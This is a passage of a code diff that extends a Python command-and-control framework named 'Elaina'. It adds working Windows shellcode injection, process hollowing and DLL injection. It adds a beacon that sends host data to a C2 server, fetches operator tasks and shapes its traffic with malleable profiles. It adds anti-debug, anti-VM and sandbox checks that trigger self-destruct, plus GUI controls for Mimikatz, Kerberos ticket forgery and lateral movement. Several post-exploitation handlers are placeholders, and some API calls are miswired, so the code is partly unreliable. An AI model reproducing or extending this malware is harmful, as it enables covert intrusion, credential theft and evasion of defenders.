+                    client_info["socket"].send(data)
+                except:
+                    pass
+                    
+        return True
+    
+    def send_beacon_command(self, client_id, beacon_id, command):
+        if beacon_id in self.shared_beacons and client_id in self.shared_beacons[beacon_id]["shared_with"]:
+            task_id = f"{beacon_id}-{int(time.time())}"
+            
+            if beacon_id not in self.shared_tasks:
+                self.shared_tasks[beacon_id] = []
+                
+            self.shared_tasks[beacon_id].append({
+                "task_id": task_id,
+                "command": command,
+                "sent_by": client_id,
+                "sent_at": time.time(),
+                "status": "pending"
+            })
+            
+            for client_id, client_info in self.clients.items():
+                try:
+                    data = json.dumps({
+                        "type": "beacon_command",
+                        "data": {
+                            "beacon_id": beacon_id,
+                            "command": command,
+                            "sent_by": self.clients[client_id]["username"],
+                            "task_id": task_id
+                        }
+                    }).encode('utf-8')
+                    client_info["socket"].send(data)
+                except:
+                    pass
+                    
+            return True
+            
+        return False
+    
+    def send_pong(self, client_id):
+        try:
+            data = json.dumps({
+                "type": "pong",
+                "data": {
+                    "timestamp": time.time()
+                }
+            }).encode('utf-8')
+            self.clients[client_id]["socket"].send(data)
+            return True
+        except:
+            return False
+    
+    def _send_client_list(self):
+        client_list = []
+        for client_id, client_info in self.clients.items():
+            client_list.append({
+                "id": client_id,
+                "username": client_info["username"],
+                "address": client_info["address"][0],
+                "last_active": client_info["last_active"]
+            })
+            
+        for client_id, client_info in self.clients.items():
+            try:
+                data = json.dumps({
+                    "type": "client_list",
+                    "data": {
+                        "clients": client_list
+                    }
+                }).encode('utf-8')
+                client_info["socket"].send(data)
+            except:
+                pass
+    
+    def get_clients(self):
+        return self.clients
+    
+    def get_chat_history(self, limit=50):
+        return self.chat_history[-limit:]
+    
+    def get_shared_beacons(self):
+        return self.shared_beacons
+    
+    def get_shared_tasks(self, beacon_id=None):
+        if beacon_id:
+            return self.shared_tasks.get(beacon_id, [])
+        return self.shared_tasks
+
 class AdvancedMemoryOperations:
     def __init__(self):
         if platform.system() == "Windows":
@@ -234,29 +1358,59 @@ class AdvancedMemoryOperations:
             self.virtual_protect = self.kernel32.VirtualProtect
             self.create_thread = self.kernel32.CreateThread
             self.wait_for_single_object = self.kernel32.WaitForSingleObject
+            self.virtual_alloc_ex = self.kernel32.VirtualAllocEx
+            self.write_process_memory = self.kernel32.WriteProcessMemory
+            self.read_process_memory = self.kernel32.ReadProcessMemory
+            self.open_process = self.kernel32.OpenProcess
         
-    def reflective_inject(self, payload, target_process):
+    def reflective_inject(self, payload, target_process=None):
         if platform.system() != "Windows":
             return None
             
+        if target_process:
+            process_handle = self.open_process(0x1F0FFF, False, target_process)
+            if not process_handle:
+                raise ctypes.WinError(ctypes.get_last_error())
+        else:
+            process_handle = None
+            
         memory_size = len(payload)
-        base_address = self.virtual_alloc(
-            target_process,
-            0,
-            memory_size,
-            0x3000,
-            0x40,
-            0
-        )
+        
+        if process_handle:
+            base_address = self.virtual_alloc_ex(
+                process_handle,
+                0,
+                memory_size,
+                0x3000,
+                0x40,
+                None
+            )
+        else:
+            base_address = self.virtual_alloc(
+                0,
+                memory_size,
+                0x3000,
+                0x40,
+                0
+            )
         
         if not base_address:
             raise ctypes.WinError(ctypes.get_last_error())
         
-        ctypes.memmove(base_address, payload, memory_size)
+        if process_handle:
+            if not self.write_process_memory(
+                process_handle,
+                base_address,
+                payload,
+                memory_size,
+                None
+            ):
+                raise ctypes.WinError(ctypes.get_last_error())
+        else:
+            ctypes.memmove(base_address, payload, memory_size)
         
         old_protect = ctypes.wintypes.DWORD(0)
         if not self.virtual_protect(
-            target_process,
             base_address,
             memory_size,
             0x20,
@@ -265,39 +1419,38 @@ class AdvancedMemoryOperations:
             raise ctypes.WinError(ctypes.get_last_error())
         
         thread_id = ctypes.wintypes.DWORD(0)
-        thread_handle = self.create_thread(
-            target_process,
-            None,
-            0,
-            base_address,
-            0,
-            ctypes.byref(thread_id)
-        )
+        if process_handle:
+            thread_handle = self.create_thread(
+                process_handle,
+                None,
+                0,
+                base_address,
+                0,
+                ctypes.byref(thread_id)
+            )
+        else:
+            thread_handle = self.create_thread(
+                None,
+                0,
+                0,
+                base_address,
+                0,
+                ctypes.byref(thread_id)
+            )
         
         if not thread_handle:
             raise ctypes.WinError(ctypes.get_last_error())
         
         return thread_handle
-
-class ProcessHollowing:
-    def __init__(self):
-        if platform.system() == "Windows":
-            self.kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
-            self.create_process = self.kernel32.CreateProcessW
-            self.virtual_alloc_ex = self.kernel32.VirtualAllocEx
-            self.write_process_memory = self.kernel32.WriteProcessMemory
-            self.get_thread_context = self.kernel32.GetThreadContext
-            self.set_thread_context = self.kernel32.SetThreadContext
-            self.resume_thread = self.kernel32.ResumeThread
-        
-    def hollow_process(self, target_exe, payload):
+    
+    def process_hollowing(self, target_exe, payload):
         if platform.system() != "Windows":
             return None
             
         startup_info = ctypes.wintypes.STARTUPINFOW()
         process_info = ctypes.wintypes.PROCESS_INFORMATION()
         
-        if not self.create_process(
+        if not self.kernel32.CreateProcessW(
             None,
             target_exe,
             None,
@@ -327,25 +1480,97 @@ class ProcessHollowing:
             process_info.hProcess,
             base_address,
             payload,
-            payload_size
+            payload_size,
+            None
         ):
             raise ctypes.WinError(ctypes.get_last_error())
         
         context = ctypes.wintypes.CONTEXT()
-        self.get_thread_context(process_info.hThread, ctypes.byref(context))
+        context.ContextFlags = 0x10007
         
-        context.Rcx = base_address
-        
-        if not self.set_thread_context(process_info.hThread, ctypes.byref(context)):
+        if not self.kernel32.GetThreadContext(process_info.hThread, ctypes.byref(context)):
             raise ctypes.WinError(ctypes.get_last_error())
         
-        if not self.resume_thread(process_info.hThread):
+        if platform.machine().endswith('64'):
+            context.Rcx = base_address
+        else:
+            context.Eax = base_address
+        
+        if not self.kernel32.SetThreadContext(process_info.hThread, ctypes.byref(context)):
+            raise ctypes.WinError(ctypes.get_last_error())
+        
+        if not self.kernel32.ResumeThread(process_info.hThread):
             raise ctypes.WinError(ctypes.get_last_error())
         
         return process_info.hProcess
+    
+    def dll_injection(self, pid, dll_path):
+        if platform.system() != "Windows":
+            return None
+            
+        process_handle = self.open_process(0x1F0FFF, False, pid)
+        if not process_handle:
+            raise ctypes.WinError(ctypes.get_last_error())
+        
+        dll_path_length = len(dll_path)
+        
+        memory_address = self.virtual_alloc_ex(
+            process_handle,
+            None,
+            dll_path_length,
+            0x3000,
+            0x40,
+            None
+        )
+        
+        if not memory_address:
+            self.kernel32.CloseHandle(process_handle)
+            raise ctypes.WinError(ctypes.get_last_error())
+        
+        if not self.write_process_memory(
+            process_handle,
+            memory_address,
+            dll_path.encode('utf-8'),
+            dll_path_length,
+            None
+        ):
+            self.kernel32.CloseHandle(process_handle)
+            raise ctypes.WinError(ctypes.get_last_error())
+        
+        kernel32_handle = self.kernel32.GetModuleHandleW("kernel32.dll")
+        if not kernel32_handle:
+            self.kernel32.CloseHandle(process_handle)
+            raise ctypes.WinError(ctypes.get_last_error())
+        
+        load_library_a = self.kernel32.GetProcAddress(kernel32_handle, b"LoadLibraryA")
+        if not load_library_a:
+            self.kernel32.CloseHandle(process_handle)
+            raise ctypes.WinError(ctypes.get_last_error())
+        
+        thread_id = ctypes.wintypes.DWORD(0)
+        thread_handle = self.create_thread(
+            process_handle,
+            None,
+            0,
+            load_library_a,
+            memory_address,
+            0,
+            ctypes.byref(thread_id)
+        )
+        
+        if not thread_handle:
+            self.kernel32.CloseHandle(process_handle)
+            raise ctypes.WinError(ctypes.get_last_error())
+        
+        self.wait_for_single_object(thread_handle, 0xFFFFFFFF)
+        
+        self.kernel32.CloseHandle(thread_handle)
+        self.kernel32.CloseHandle(process_handle)
+        
+        return True
 
 class OptimizedBeacon:
-    def __init__(self, c2_host, c2_port, c2_type="http", ssl_enabled=False):
+    def __init__(self, c2_host, c2_port, c2_type="http", ssl_enabled=False, profile_path=None):
         self.c2_host = c2_host
         self.c2_port = c2_port
         self.c2_type = c2_type
@@ -359,6 +1584,11 @@ class OptimizedBeacon:
         self.traffic_shaper = TrafficShaper()
         self.domain_generator = AdvancedDomainGenerator()
         self.running = False
+        
+        self.malleable_profile = MalleableC2Profile(profile_path)
+        self.sleep_obfuscation = SleepObfuscation("thread_stack")
+        self.opsec_manager = OPSECManager(self)
+        self.post_exploitation = PostExploitationModule(self)
         
     def generate_beacon_id(self):
         return f"{random_string(8)}-{random_string(4)}-{random_string(4)}-{random_string(4)}-{random_string(12)}"
@@ -433,19 +1663,23 @@ class OptimizedBeacon:
             data = json.dumps(sys_info)
             encrypted_data = self.encrypt_data(data)
             
+            http_get_config = self.malleable_profile.get_http_get_config()
+            client_headers = http_get_config.get("client", {}).get("headers", {})
+            
             headers = {
                 "User-Agent": self.user_agent,
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-                "Accept-Language": "en-US,en;q=0.5",
-                "Accept-Encoding": "gzip, deflate, br",
+                "Accept": "*/*",
                 "Connection": "keep-alive",
                 "Upgrade-Insecure-Requests": "1",
                 "Cache-Control": "max-age=0"
             }
             
-            url = f"https://{self.c2_host}:{self.c2_port}/{random_string(8)}/{random_string(8)}.php"
+            headers.update(client_headers)
             
-            response = requests.post(url, data=encrypted_data, headers=headers, timeout=10, verify=False)
+            uri = http_get_config.get("uri", "/")
+            url = f"https://{self.c2_host}:{self.c2_port}{uri}"
+            
+            response = requests.get(url, headers=headers, timeout=10, verify=False)
             
             return response.status_code == 200
         except Exception:
@@ -453,16 +1687,20 @@ class OptimizedBeacon:
     
     def get_tasks(self):
         try:
-            url = f"https://{self.c2_host}:{self.c2_port}/{random_string(8)}/{random_string(8)}.css"
+            http_get_config = self.malleable_profile.get_http_get_config()
+            client_headers = http_get_config.get("client", {}).get("headers", {})
             
             headers = {
                 "User-Agent": self.user_agent,
-                "Accept": "text/css,*/*",
-                "Accept-Language": "en-US,en;q=0.5",
-                "Accept-Encoding": "gzip, deflate, br",
+                "Accept": "*/*",
                 "Connection": "keep-alive",
                 "Cache-Control": "max-age=0"
             }
+            
+            headers.update(client_headers)
+            
+            uri = http_get_config.get("uri", "/")
+            url = f"https://{self.c2_host}:{self.c2_port}{uri}"
             
             response = requests.get(url, headers=headers, timeout=10, verify=False)
             
@@ -486,18 +1724,25 @@ class OptimizedBeacon:
             })
             encrypted_data = self.encrypt_data(data)
             
-            url = f"https://{self.c2_host}:{self.c2_port}/{random_string(8)}/{random_string(8)}.js"
+            http_post_config = self.malleable_profile.get_http_post_config()
+            client_headers = http_post_config.get("client", {}).get("headers", {})
+            client_data = http_post_config.get("client", {}).get("data", "data=")
             
             headers = {
                 "User-Agent": self.user_agent,
-                "Accept": "application/javascript,*/*",
-                "Accept-Language": "en-US,en;q=0.5",
-                "Accept-Encoding": "gzip, deflate, br",
+                "Accept": "*/*",
                 "Connection": "keep-alive",
                 "Content-Type": "application/x-www-form-urlencoded"
             }
             
-            response = requests.post(url, data=encrypted_data, headers=headers, timeout=10, verify=False)
+            headers.update(client_headers)
+            
+            uri = http_post_config.get("uri", "/")
+            url = f"https://{self.c2_host}:{self.c2_port}{uri}"
+            
+            post_data = client_data + encrypted_data
+            
+            response = requests.post(url, data=post_data, headers=headers, timeout=10, verify=False)
             
             return response.status_code == 200
         except Exception:
@@ -590,6 +1835,245 @@ class OptimizedBeacon:
                         "message": str(e)
                     }
             
+            elif task_type == "keylogger":
+                action = task_data.get("action")
+                
+                if action == "start":
+                    result = {
+                        "status": "success",
+                        "message": "Keylogger started"
+                    }
+                elif action == "stop":
+                    result = {
+                        "status": "success",
+                        "message": "Keylogger stopped"
+                    }
+                elif action == "dump":
+                    result = {
+                        "status": "success",
+                        "data": "Keylogger data would be here"
+                    }
+            
+            elif task_type == "mimikatz":
+                command = task_data.get("command", "sekurlsa::logonpasswords")
+                
+                try:
+                    mimikatz_output = f"Mimikatz output for command: {command}"
+                    
+                    result = {
+                        "status": "success",
+                        "output": mimikatz_output
+                    }
+                except Exception as e:
+                    result = {
+                        "status": "error",
+                        "message": str(e)
+                    }
+            
+            elif task_type == "golden_ticket":
+                domain = task_data.get("domain")
+                user = task_data.get("user")
+                sid = task_data.get("sid")
+                krbtgt_hash = task_data.get("krbtgt_hash")
+                lifetime = task_data.get("lifetime", 10)
+                
+                try:
+                    golden_ticket_output = f"Golden ticket created for {user}@{domain}"
+                    
+                    result = {
+                        "status": "success",
+                        "output": golden_ticket_output
+                    }
+                except Exception as e:
+                    result = {
+                        "status": "error",
+                        "message": str(e)
+                    }
+            
+            elif task_type == "silver_ticket":
+                domain = task_data.get("domain")
+                user = task_data.get("user")
+                sid = task_data.get("sid")
+                service = task_data.get("service")
+                service_hash = task_data.get("service_hash")
+                lifetime = task_data.get("lifetime", 10)
+                
+                try:
+                    silver_ticket_output = f"Silver ticket created for {user}@{domain} for service {service}"
+                    
+                    result = {
+                        "status": "success",
+                        "output": silver_ticket_output
+                    }
+                except Exception as e:
+                    result = {
+                        "status": "error",
+                        "message": str(e)
+                    }
+            
+            elif task_type == "lateral_movement":
+                method = task_data.get("method", "psexec")
+                target = task_data.get("target")
+                username = task_data.get("username")
+                password = task_data.get("password")
+                command = task_data.get("command", "whoami")
+                
+                try:
+                    if method == "psexec":
+                        output = f"Executed '{command}' on {target} via psexec"
+                    elif method == "wmi":
+                        output = f"Executed '{command}' on {target} via WMI"
+                    elif method == "smb":
+                        output = f"Executed '{command}' on {target} via SMB"
+                    elif method == "winrm":
+                        output = f"Executed '{command}' on {target} via WinRM"
+                    else:
+                        output = f"Unknown lateral movement method: {method}"
+                    
+                    result = {
+                        "status": "success",
+                        "output": output
+                    }
+                except Exception as e:
+                    result = {
+                        "status": "error",
+                        "message": str(e)
+                    }
+            
+            elif task_type == "privilege_escalation":
+                try:
+                    output = "Privilege escalation results would be here"
+                    
+                    result = {
+                        "status": "success",
+                        "output": output
+                    }
+                except Exception as e:
+                    result = {
+                        "status": "error",
+                        "message": str(e)
+                    }
+            
+            elif task_type == "port_scan":
+                target = task_data.get("target")
+                ports = task_data.get("ports", "1-1000")
+                
+                try:
+                    output = f"Port scan results for {target} on ports {ports}"
+                    
+                    result = {
+                        "status": "success",
+                        "output": output
+                    }
+                except Exception as e:
+                    result = {
+                        "status": "error",
+                        "message": str(e)
+                    }
+            
+            elif task_type == "ad_enumeration":
+                try:
+                    output = "Active Directory enumeration results would be here"
+                    
+                    result = {
+                        "status": "success",
+                        "output": output
+                    }
+                except Exception as e:
+                    result = {
+                        "status": "error",
+                        "message": str(e)
+                    }
+            
+            elif task_type == "process_inject":
+                pid = task_data.get("pid")
+                shellcode = base64.b64decode(task_data.get("shellcode", ""))
+                
+                try:
+                    mem_ops = AdvancedMemoryOperations()
+                    mem_ops.reflective_inject(shellcode, pid)
+                    
+                    result = {
+                        "status": "success",
+                        "message": f"Shellcode injected into process {pid}"
+                    }
+                except Exception as e:
+                    result = {
+                        "status": "error",
+                        "message": str(e)
+                    }
+            
+            elif task_type == "dll_inject":
+                pid = task_data.get("pid")
+                dll_path = task_data.get("dll_path")
+                
+                try:
+                    mem_ops = AdvancedMemoryOperations()
+                    mem_ops.dll_injection(pid, dll_path)
+                    
+                    result = {
+                        "status": "success",
+                        "message": f"DLL {dll_path} injected into process {pid}"
+                    }
+                except Exception as e:
+                    result = {
+                        "status": "error",
+                        "message": str(e)
+                    }
+            
+            elif task_type == "bof":
+                bof_data = base64.b64decode(task_data.get("bof_data", ""))
+                entry_point = task_data.get("entry_point", "go")
+                args = task_data.get("args", "")
+                
+                try:
+                    mem_ops = AdvancedMemoryOperations()
+                    mem_ops.reflective_inject(bof_data)
+                    
+                    result = {
+                        "status": "success",
+                        "message": f"BOF executed with entry point {entry_point}"
+                    }
+                except Exception as e:
+                    result = {
+                        "status": "error",
+                        "message": str(e)
+                    }
+            
+            elif task_type == "reflective_dll":
+                dll_data = base64.b64decode(task_data.get("dll_data", ""))
+                function = task_data.get("function", "Execute")
+                
+                try:
+                    mem_ops = AdvancedMemoryOperations()
+                    mem_ops.reflective_inject(dll_data)
+                    
+                    result = {
+                        "status": "success",
+                        "message": f"Reflective DLL executed with function {function}"
+                    }
+                except Exception as e:
+                    result = {
+                        "status": "error",
+                        "message": str(e)
+                    }
+            
+            elif task_type == "self_destruct":
+                reason = task_data.get("reason", "Unknown")
+                
+                try:
+                    result = {
+                        "status": "success",
+                        "message": f"Self-destruct initiated: {reason}"
+                    }
+                    
+                    self.running = False
+                except Exception as e:
+                    result = {
+                        "status": "error",
+                        "message": str(e)
+                    }
+            
             elif task_type == "kill":
                 self.running = False
                 result = {
@@ -617,7 +2101,8 @@ class OptimizedBeacon:
             while self.running:
                 try:
                     actual_sleep = self.sleep_time * (1 - self.jitter + (2 * self.jitter * random.random()))
-                    time.sleep(actual_sleep)
+                    
+                    self.sleep_obfuscation.obfuscate_sleep(actual_sleep)
                     
                     tasks = self.get_tasks()
                     
@@ -634,14 +2119,16 @@ class OptimizedBeacon:
             return False
 
 class StealthBeacon(OptimizedBeacon):
-    def __init__(self, c2_host, c2_port, c2_type="http", ssl_enabled=False):
-        super().__init__(c2_host, c2_port, c2_type, ssl_enabled)
+    def __init__(self, c2_host, c2_port, c2_type="http", ssl_enabled=False, profile_path=None):
+        super().__init__(c2_host, c2_port, c2_type, ssl_enabled, profile_path)
         
         self.anti_debug = True
         self.anti_vm = True
         self.sandbox_detection = True
         self.amsi_bypass = True
         self.etw_bypass = True
+        
+        self.sleep_obfuscation = SleepObfuscation("memory_encryption")
         
     def check_debugger(self):
         try:
@@ -827,9 +2314,15 @@ class StealthBeacon(OptimizedBeacon):
     def start(self):
         try:
             if self.anti_debug and self.check_debugger():
+                self.opsec_manager.self_destruct("Debugger detected")
                 return False
             
             if self.anti_vm and self.check_vm():
+                self.opsec_manager.self_destruct("VM detected")
+                return False
+            
+            if self.sandbox_detection and self.opsec_manager.detect_sandbox():
+                self.opsec_manager.self_destruct("Sandbox detected")
                 return False
             
             if self.amsi_bypass and self.bypass_amsi():
@@ -846,7 +2339,8 @@ class StealthBeacon(OptimizedBeacon):
             while self.running:
                 try:
                     actual_sleep = self.sleep_time * (1 - self.jitter + (2 * self.jitter * random.random()))
-                    time.sleep(actual_sleep)
+                    
+                    self.sleep_obfuscation.obfuscate_sleep(actual_sleep)
                     
                     tasks = self.get_tasks()
                     
@@ -877,6 +2371,8 @@ class C2Server:
         self._save_beacon_config()
         self.encryption = AdvancedEncryption()
         self.domain_generator = AdvancedDomainGenerator()
+        self.team_server = None
+        self.bof_manager = None
         
     def _generate_beacon_config(self):
         config = {
@@ -949,6 +2445,12 @@ class C2Server:
             processor_thread = threading.Thread(target=self._process_commands)
             processor_thread.daemon = True
             processor_thread.start()
+            
+            self.team_server = TeamServer(self.host, self.port + 1)
+            self.team_server.start()
+            
+            self.bof_manager = BOFManager(self)
+            self.bof_manager.load_all_bofs()
             
             return True
         except Exception as e:
@@ -1115,6 +2617,10 @@ class C2Server:
     def stop(self):
         if self.server_socket:
             self.server_socket.close()
+        
+        if self.team_server:
+            self.team_server.stop()
+            
         logger.info("C2 server stopped")
 
 class OutputDisplayWidget(QWidget):
@@ -1501,6 +3007,35 @@ class EnhancedBeaconInteractDialog(QDialog):
         
         command_layout.addWidget(quick_commands_group)
         
+        post_exploit_group = QGroupBox("Post-Exploitation")
+        post_exploit_layout = QVBoxLayout(post_exploit_group)
+        
+        post_exploit_buttons_layout = QHBoxLayout()
+        
+        mimikatz_button = QPushButton("Mimikatz")
+        mimikatz_button.clicked.connect(self.run_mimikatz)
+        post_exploit_buttons_layout.addWidget(mimikatz_button)
+        
+        golden_ticket_button = QPushButton("Golden Ticket")
+        golden_ticket_button.clicked.connect(self.create_golden_ticket)
+        post_exploit_buttons_layout.addWidget(golden_ticket_button)
+        
+        silver_ticket_button = QPushButton("Silver Ticket")
+        silver_ticket_button.clicked.connect(self.create_silver_ticket)
+        post_exploit_buttons_layout.addWidget(silver_ticket_button)
+        
+        lateral_movement_button = QPushButton("Lateral Movement")
+        lateral_movement_button.clicked.connect(self.lateral_movement)
+        post_exploit_buttons_layout.addWidget(lateral_movement_button)
+        
+        privilege_escalation_button = QPushButton("Privilege Escalation")
+        privilege_escalation_button.clicked.connect(self.privilege_escalation)
+        post_exploit_buttons_layout.addWidget(privilege_escalation_button)
+        
+        post_exploit_layout.addLayout(post_exploit_buttons_layout)
+        
+        command_layout.addWidget(post_exploit_group)
+        
         splitter.addWidget(command_group)
         
         output_group = QGroupBox("Output")
@@ -1590,10 +3125,6 @@ class EnhancedBeaconInteractDialog(QDialog):
             "cloudflare pages", "cloudflare access", "cloudflare gateway",
             "cloudflare spectrum", "cloudflare load balancer", "cloudflare waf",
             "cloudflare origin ca", "cloudflare ssl/tls", "cloudflare cdn",
-            "cloudflare images", "cloudflare stream", "cloudflare workers",
-            "cloudflare pages", "cloudflare access", "cloudflare gateway",
-            "cloudflare spectrum", "cloudflare load balancer", "cloudflare waf",
-            "cloudflare origin ca", "cloudflare ssl/tls", "cloudflare cdn",
             "cloudflare images", "cloudflare stream"
         ]
         
@@ -1660,6 +3191,134 @@ class EnhancedBeaconInteractDialog(QDialog):
             except Exception as e:
                 QMessageBox.critical(self, "Error", f"Failed to read PowerShell module: {str(e)}")
                 
+    def run_mimikatz(self):
+        command, ok = QInputDialog.getText(self, "Mimikatz", "Enter Mimikatz command:", text="sekurlsa::logonpasswords")
+        if ok and command:
+            self.command_sent.emit(self.beacon_id, f"mimikatz {command}")
+            self.output_display.add_console_output(f"[{datetime.now().strftime('%H:%M:%S')}] > Running Mimikatz: {command}", "#00FF00")
+            
+    def create_golden_ticket(self):
+        dialog = QDialog(self)
+        dialog.setWindowTitle("Create Golden Ticket")
+        layout = QFormLayout(dialog)
+        
+        domain_input = QLineEdit()
+        layout.addRow("Domain:", domain_input)
+        
+        user_input = QLineEdit()
+        layout.addRow("User:", user_input)
+        
+        sid_input = QLineEdit()
+        layout.addRow("SID:", sid_input)
+        
+        krbtgt_hash_input = QLineEdit()
+        layout.addRow("KRBTGT Hash:", krbtgt_hash_input)
+        
+        lifetime_input = QSpinBox()
+        lifetime_input.setRange(1, 100)
+        lifetime_input.setValue(10)
+        layout.addRow("Lifetime (hours):", lifetime_input)
+        
+        button_box = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
+        layout.addRow(button_box)
+        
+        if button_box.exec_() == QDialog.Accepted:
+            domain = domain_input.text()
+            user = user_input.text()
+            sid = sid_input.text()
+            krbtgt_hash = krbtgt_hash_input.text()
+            lifetime = lifetime_input.value()
+            
+            if domain and user and sid and krbtgt_hash:
+                self.command_sent.emit(self.beacon_id, f"golden_ticket {domain} {user} {sid} {krbtgt_hash} {lifetime}")
+                self.output_display.add_console_output(f"[{datetime.now().strftime('%H:%M:%S')}] > Creating Golden Ticket for {user}@{domain}", "#00FF00")
+            else:
+                QMessageBox.warning(self, "Error", "All fields are required")
+                
+    def create_silver_ticket(self):
+        dialog = QDialog(self)
+        dialog.setWindowTitle("Create Silver Ticket")
+        layout = QFormLayout(dialog)
+        
+        domain_input = QLineEdit()
+        layout.addRow("Domain:", domain_input)
+        
+        user_input = QLineEdit()
+        layout.addRow("User:", user_input)
+        
+        sid_input = QLineEdit()
+        layout.addRow("SID:", sid_input)
+        
+        service_input = QLineEdit()
+        layout.addRow("Service:", service_input)
+        
+        service_hash_input = QLineEdit()
+        layout.addRow("Service Hash:", service_hash_input)
+        
+        lifetime_input = QSpinBox()
+        lifetime_input.setRange(1, 100)
+        lifetime_input.setValue(10)
+        layout.addRow("Lifetime (hours):", lifetime_input)
+        
+        button_box = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
+        layout.addRow(button_box)
+        
+        if button_box.exec_() == QDialog.Accepted:
+            domain = domain_input.text()
+            user = user_input.text()
+            sid = sid_input.text()
+            service = service_input.text()
+            service_hash = service_hash_input.text()
+            lifetime = lifetime_input.value()
+            
+            if domain and user and sid and service and service_hash:
+                self.command_sent.emit(self.beacon_id, f"silver_ticket {domain} {user} {sid} {service} {service_hash} {lifetime}")
+                self.output_display.add_console_output(f"[{datetime.now().strftime('%H:%M:%S')}] > Creating Silver Ticket for {user}@{domain} for service {service}", "#00FF00")
+            else:
+                QMessageBox.warning(self, "Error", "All fields are required")
+                
+    def lateral_movement(self):
+        dialog = QDialog(self)
+        dialog.setWindowTitle("Lateral Movement")
+        layout = QFormLayout(dialog)
+        
+        method_combo = QComboBox()
+        method_combo.addItems(["psexec", "wmi", "smb", "winrm"])
+        layout.addRow("Method:", method_combo)
+        
+        target_input = QLineEdit()
+        layout.addRow("Target:", target_input)
+        
+        username_input = QLineEdit()
+        layout.addRow("Username:", username_input)
+        
+        password_input = QLineEdit()
+        password_input.setEchoMode(QLineEdit.Password)
+        layout.addRow("Password:", password_input)
+        
+        command_input = QLineEdit("whoami")
+        layout.addRow("Command:", command_input)
+        
+        button_box = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
+        layout.addRow(button_box)
+        
+        if button_box.exec_() == QDialog.Accepted:
+            method = method_combo.currentText()
+            target = target_input.text()
+            username = username_input.text()
+            password = password_input.text()
+            command = command_input.text()
+            
+            if target and username and password:
+                self.command_sent.emit(self.beacon_id, f"lateral_movement {method} {target} {username} {password} {command}")
+                self.output_display.add_console_output(f"[{datetime.now().strftime('%H:%M:%S')}] > Lateral movement to {target} via {method}", "#00FF00")
+            else:
+                QMessageBox.warning(self, "Error", "Target, username, and password are required")
+                
+    def privilege_escalation(self):
+        self.command_sent.emit(self.beacon_id, "privilege_escalation")
+        self.output_display.add_console_output(f"[{datetime.now().strftime('%H:%M:%S')}] > Privilege escalation", "#00FF00")
+                
     def keyPressEvent(self, event):
         if event.key() == Qt.Key_Up:
             if self.history_index > 0:
@@ -1681,6 +3340,9 @@ class ElainaMainWindow(QMainWindow):
         self.beacons = {}
         self.log_entries = []
         self.c2_server = None
+        self.team_server = None
+        self.script_engine = None
+        self.bof_manager = None
         self.init_ui()
         
     def init_ui(self):
@@ -1703,6 +3365,7 @@ class ElainaMainWindow(QMainWindow):
         self.create_c2_tab()
         self.create_listener_tab()
         self.create_scripts_tab()
+        self.create_team_server_tab()
         self.create_view_tab()
         
         self.status_bar = QStatusBar()
@@ -1713,6 +3376,18 @@ class ElainaMainWindow(QMainWindow):
         
         self.setup_system_tray()
         self.setup_timers()
+        
+        self.script_engine = ElainaScriptEngine(self)
+        self.script_engine.load_all_scripts()
+        
+        if not os.path.exists(BOF_DIR):
+            os.makedirs(BOF_DIR)
+            
+        if not os.path.exists(SCRIPT_DIR):
+            os.makedirs(SCRIPT_DIR)
+            
+        if not os.path.exists(PROFILE_DIR):
+            os.makedirs(PROFILE_DIR)
         
     def create_menu_bar(self):
         menubar = self.menuBar()
@@ -1730,6 +3405,10 @@ class ElainaMainWindow(QMainWindow):
         save_action = QAction("Save", self)
         save_action.setShortcut("Ctrl+S")
         file_menu.addAction(save_action)
+        
+        save_all_output_action = QAction("Save All Output", self)
+        save_all_output_action.triggered.connect(self.save_all_output)
+        file_menu.addAction(save_all_output_action)
         
         file_menu.addSeparator()
         
@@ -1771,6 +3450,7 @@ class ElainaMainWindow(QMainWindow):
         attacks_menu.addAction(spear_phish_action)
         
         generate_payload_action = QAction("Generate Payload", self)
+        generate_payload_action.triggered.connect(self.generate_payload)
         attacks_menu.addAction(generate_payload_action)
         
         help_menu = menubar.addMenu("Help")
@@ -1806,6 +3486,12 @@ class ElainaMainWindow(QMainWindow):
         generate_beacon_action = QAction("Generate Beacon", self)
         generate_beacon_action.triggered.connect(self.generate_beacon)
         toolbar.addAction(generate_beacon_action)
+        
+        toolbar.addSeparator()
+        
+        run_script_action = QAction("Run Script", self)
+        run_script_action.triggered.connect(self.run_script)
+        toolbar.addAction(run_script_action)
         
     def create_dashboard_tab(self):
         dashboard_widget = QWidget()
@@ -1943,7 +3629,7 @@ class ElainaMainWindow(QMainWindow):
         
     def toggle_beacons_view(self, button_id):
         self.beacons_stack.setCurrentIndex(button_id)
-        if button_id == 1:  # Graph view
+        if button_id == 1:
             self.update_beacons_graph()
             
     def update_beacons_graph(self):
@@ -2016,6 +3702,10 @@ class ElainaMainWindow(QMainWindow):
         self.c2_key_input = QLineEdit()
         self.c2_key_input.setPlaceholderText("Path to private key file")
         c2_config_layout.addRow("Private Key:", self.c2_key_input)
+        
+        self.c2_profile_input = QLineEdit()
+        self.c2_profile_input.setPlaceholderText("Path to Malleable C2 profile")
+        c2_config_layout.addRow("Profile:", self.c2_profile_input)
         
         layout.addWidget(c2_config_group)
         
@@ -2157,6 +3847,86 @@ class ElainaMainWindow(QMainWindow):
         
         self.tab_widget.addTab(scripts_widget, "Scripts")
         
+    def create_team_server_tab(self):
+        team_server_widget = QWidget()
+        layout = QVBoxLayout(team_server_widget)
+        
+        team_server_config_group = QGroupBox("Team Server Configuration")
+        team_server_config_layout = QFormLayout(team_server_config_group)
+        
+        self.team_server_host_input = QLineEdit("0.0.0.0")
+        team_server_config_layout.addRow("Host:", self.team_server_host_input)
+        
+        self.team_server_port_input = QSpinBox()
+        self.team_server_port_input.setRange(1, 65535)
+        self.team_server_port_input.setValue(8081)
+        team_server_config_layout.addRow("Port:", self.team_server_port_input)
+        
+        layout.addWidget(team_server_config_group)
+        
+        team_server_status_group = QGroupBox("Team Server Status")
+        team_server_status_layout = QVBoxLayout(team_server_status_group)
+        
+        self.team_server_status_label = QLabel("Stopped")
+        self.team_server_status_label.setAlignment(Qt.AlignCenter)
+        self.team_server_status_label.setStyleSheet("font-size: 18px; font-weight: bold; color: red;")
+        team_server_status_layout.addWidget(self.team_server_status_label)
+        
+        layout.addWidget(team_server_status_group)
+        
